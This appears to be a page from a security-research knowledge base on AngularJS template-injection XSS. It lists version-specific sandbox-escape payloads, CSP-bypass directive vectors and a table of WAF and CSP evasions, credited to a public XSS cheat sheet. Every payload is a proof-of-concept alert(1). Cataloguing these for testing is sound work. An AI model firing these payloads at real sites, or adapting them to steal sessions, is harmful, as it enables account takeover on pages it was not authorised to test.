---
title: DOM XSS — AngularJS Framework Vectors (Sandbox Escapes + CSP Bypasses)
slug: framework-vectors-angular
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/framework-vectors-angular, technique/csti]
inbound: []
---

# DOM XSS — AngularJS Framework Vectors (Sandbox Escapes + CSP Bypasses)

## Pattern

AngularJS evaluates template expressions inside `{{ }}` in a sandboxed scope. Versions 1.0–1.5 had a series of progressively-patched sandbox escapes that chain prototype manipulation, native-function hijacking, and AST node injection to reach the global `Function` constructor. AngularJS 1.6+ removed the sandbox entirely, making `{{constructor.constructor('alert(1)')()}}` work directly. CSP bypass techniques use AngularJS directives (`ng-focus`, `ng-cut`) with `$event.composedPath()` and `orderBy` filter to call `alert` without needing `eval` or `new Function`.

## Preconditions

- AngularJS (`angular.js` / `angular.min.js`) loaded on the page.
- Attacker input reflected inside an AngularJS template expression context (`{{ }}`) — either server-reflected or DOM-based via `ng-bind-html`.
- For DOM-based sandbox escapes: input in a `ng-*` directive attribute that evaluates an expression (using `orderBy` filter for DOM-based path).
- CSP bypass: page has CSP but AngularJS is whitelisted (served from allowed origin or trusted types exception).

## Detection

- `js_analyzer` source: URL param / fragment flowing into `$scope` variable used in template.
- Static grep: `angular.js`, `ng-app`, `ng-bind`, `ng-bind-html` with user-controlled data.
- Version fingerprinting: `angular.version.full` in console or `<html ng-app>` attribute.
- Higher-version (≥1.6) = no sandbox → trivial CSTI via `constructor.constructor`.

## Triggering

### Sandbox escapes — reflected (by version)

```javascript
// 1.0.1–1.1.5 and >=1.6.0
{{constructor.constructor('alert(1)')()}}

// 1.0.1–1.1.5 shorter / >=1.6.0 shorter
{{$on.constructor('alert(1)')()}}

// 1.2.0–1.2.1
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// 1.2.2–1.2.5 and 1.2.24–1.2.29 / 1.3.0–1.3.20
{{{}.")));alert(1)//"}}

// 1.2.6–1.2.18
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

// 1.2.19–1.2.23
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}

// 1.3.3–1.3.18
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}

// 1.3.19
{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}

// 1.3.20
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}

// 1.4.0–1.4.9
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// 1.5.0–1.5.8
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### Sandbox escapes — DOM-based / orderBy (by version)

```javascript
// 1.0.1–1.1.5 and >=1.6.0 (no $eval, use orderBy)
constructor.constructor('alert(1)')()

// 1.2.27–1.2.29 / 1.3.0–1.3.20 (DOM)
{}.")));alert(1)//";

// 1.4.0–1.4.5
'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';

// 1.4.2–1.5.8
{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'

// 1.4.4 without strings
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

### AngularJS CSP bypasses (all versions, all browsers)

```html
<!-- Using Array.from (all versions, all browsers) -->
<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">

<!-- Shorter using assignment -->
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>

<!-- Via oncut -->
<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>

<!-- 1.2.0–1.5.0 via ng-repeat and $event.view -->
<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>
```

## Bypasses

| Defense | Bypass |
|---|---|
| Patch sandbox (update AngularJS) | v1.6+ has no sandbox → `{{constructor.constructor(...)()}}` works |
| WAF blocks `constructor` | Use `$on.constructor` (shorter), or version-specific `toString`/`sort` chain |
| Block `alert` string literal | Use `$event.view.alert` or `Array.from([1],alert)` |
| CSP blocks `eval`/`new Function` | `ng-focus` + `orderBy` + `composedPath()` bypass (no eval needed) |
| Block `orderBy` filter | Use `ng-cut` + `composedPath()` |
| Strict CSP with nonce | AngularJS must be disallowed from CSP policy to fully block |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed., AngularJS sections)
- [./client-side-template-injection.md](./client-side-template-injection.md) — parent CSTI pattern page
